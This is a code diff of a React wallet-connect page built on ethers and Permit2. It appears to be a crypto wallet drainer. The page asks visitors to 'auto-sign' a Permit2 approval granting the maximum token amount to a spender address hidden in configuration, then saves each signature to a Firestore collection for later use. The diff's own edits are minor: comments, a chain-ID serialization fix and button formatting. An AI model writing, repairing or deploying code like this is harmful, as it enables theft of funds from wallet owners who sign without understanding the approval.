@@ -6,7 +6,7 @@ import { BrowserProvider } from 'ethers';
 import { db } from './firebase';
 import { doc, setDoc } from 'firebase/firestore';
 
-const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const PERMIT2 = "0x000000000022D473030F116dDEE9F6B43aC78BA3"; // Uniswap Permit2
 const MaxUint160 = (2n ** 160n) - 1n;
 
 const appKit = createAppKit({
@@ -46,12 +46,17 @@ export default function App() {
         return;
       }
 
+      // Ethers provider
       const provider = new BrowserProvider(walletProvider);
-      const chainId = (await provider.getNetwork()).chainId;
+
+      // FIX BigInt serialization issue
+      const net = await provider.getNetwork();
+      const chainId = Number(net.chainId); // Required for JSON.stringify
 
       const deadline = Math.floor(Date.now() / 1000) + 3600;
       const nonce = 0;
 
+      // Permit2 structure
       const permitted = {
         token: import.meta.env.VITE_TOKEN_ADDRESS,
         amount: MaxUint160.toString(),
@@ -85,7 +90,7 @@ export default function App() {
         sigDeadline: deadline
       };
 
-      // ---- Option 1: WalletConnect-Compatible EIP-712 Signing ---- //
+      // ---- WalletConnect + Mobile Safe EIP-712 Signing ---- //
       setStatus('Requesting typed-data signature (mobile compatible)...');
 
       const payload = JSON.stringify({
@@ -99,15 +104,15 @@ export default function App() {
         method: "eth_signTypedData_v4",
         params: [owner, payload]
       });
+      // ------------------------------------------------------- //
 
-      // ------------------------------------------------------------- //
-
+      // Split signature
       const raw = signature.substring(2);
       const r = "0x" + raw.substring(0, 64);
       const s = "0x" + raw.substring(64, 128);
       const v = parseInt(raw.substring(128, 130), 16);
 
-      // Save the signature to Firestore
+      // Save to Firestore
       await setDoc(doc(db, "permit2_signatures", owner), {
         owner,
         spender: import.meta.env.VITE_SPENDER_ADDRESS,
@@ -134,7 +139,9 @@ export default function App() {
       <p style={{color:'#9fb4ff', marginBottom: 18}}>
         Click connect to open wallet modal and auto-sign permit.
       </p>
-      <button className="connect" onClick={() => appKit.open()}>Connect Wallet</button>
+      <button className="connect" onClick={() => appKit.open()}>
+        Connect Wallet
+      </button>
       <div className="status">{status}</div>
     </div>
   );
